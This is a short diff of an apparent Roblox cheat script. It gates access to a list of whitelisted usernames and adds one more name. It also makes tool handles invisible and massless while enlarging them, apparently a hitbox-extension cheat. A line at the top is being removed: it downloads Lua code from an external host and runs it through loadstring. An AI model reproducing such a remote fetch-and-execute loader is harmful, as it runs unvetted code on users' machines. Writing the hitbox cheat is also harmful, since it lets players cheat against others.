@@ -1,9 +1,9 @@
-loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
-   local allowedUsers = {
+local allowedUsers = {
     ["meobysl"] = true,
     ["nhan311cb"] = true,
     ["NgVHuyy"] = true,
-    ["dthinh3010"] = true
+    ["dthinh3010"] = true,
+    ["PgIkNm2580"] = true
 
 }
 local currentUserName = game.Players.LocalPlayer.Name
@@ -75,7 +75,7 @@ end
                     v.Handle.Massless = true
                     v.Handle.Transparency = 1
                     a.Adornee = v.Handle
-                    v.Handle.Size = Vector3.new(10, 10, 10)
+                    v.Handle.Size = Vector3.new(9.9, 9.9, 9.9)
                     local selectionBox = Instance.new("SelectionBox",v.Handle)
                     selectionBox.Adornee = v.Handle
                     selectionBox.Color3 = Color3.new(0, 0.313725, 0.47451)
